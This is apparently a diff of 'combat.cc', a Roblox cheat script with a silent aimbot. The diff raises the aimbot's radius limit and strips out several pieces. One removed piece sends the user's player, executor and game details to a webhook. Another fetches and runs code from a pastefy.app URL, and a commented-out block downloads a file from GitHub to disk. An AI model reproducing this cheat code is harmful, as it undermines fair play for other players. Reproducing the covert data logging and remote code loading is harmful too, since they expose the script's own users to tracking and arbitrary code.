@@ -1177,10 +1177,6 @@ local Module = loadstring([=====[
         return Load("Library.luau", true, "core/Library.luau", Table)
     end
 
-    function Module:SendDataToWebhook(Table)
-        return Load("NikoletoService.luau", true, "utils/NikoletoService.luau", Table)
-    end
-
     local CoolEmptyTable = {}
 
     Module.Tables = {
@@ -7796,7 +7792,7 @@ task.spawn(function()
 				Text = "Circle Radius",
 				Default = SilentAimbot.FOVCircle.Radius,
 				Min = 50,
-				Max = 250,
+				Max = 500,
 				Rounding = 0,
 				Compact = false,
 				Callback = function(Radius)
@@ -10520,7 +10516,7 @@ game:GetService("Players").LocalPlayer.Character:WaitForChild("Drone EMP"):WaitF
 	end
 end)
 
-task.spawn(function()
+--[[task.spawn(function()
 	writefile("combat.cc/Nikoleto.iy", tostring(game:HttpGet(
 		"https://raw.githubusercontent.com/nikoladhima/combat.cc/refs/heads/main/utils/Nikoleto.iy"
 	)))
@@ -10561,7 +10557,7 @@ task.spawn(function()
 			eventBinds = {OnExecute = "", OnSpawn = "", OnDied = "", OnDamage = "", OnKilled = "", OnJoin = "", OnLeave = "", OnChatted = ""}
 		}))
 	end
-end)
+end)]]
 
 Library:Notify({
 	Title = "[[ combat.cc ]]",
@@ -10712,24 +10708,7 @@ task.spawn(function()
 	Invite(VerifyChannelInvite)
 end)
 
-ThreadManager:Start("CustomCode", function()
-	nsloadstring(false, "https://pastefy.app/e58XLuoV/raw", {Players, LocalPlayer})
-end, 5)
-
 print("[nikoletoscripts/combat.cc]: Loaded script successfully in", tick() - StartTick .. "s.")
-
-task.spawn(function(...)
-	if (...) and type((...)) == "string" and (...) == "RemoveLogging" then
-		warn("[Service Info] RemoveLogging is enabled, this means that ZERO information will be logged.")
-		return
-	end
-
-	if not Module:SendDataToWebhook({
-		UserInputService, LocalPlayer, HttpService, ExecutorName, CurrentGameName, httprequest
-	}) then
-		Module.Errors += 1
-	end
-end, (...))
 
 if Module.Errors > 0 then
 	warn("[nikoletoscripts/combat.cc]:", Module.Errors, "Module Errors were found. Script will continue to function.")
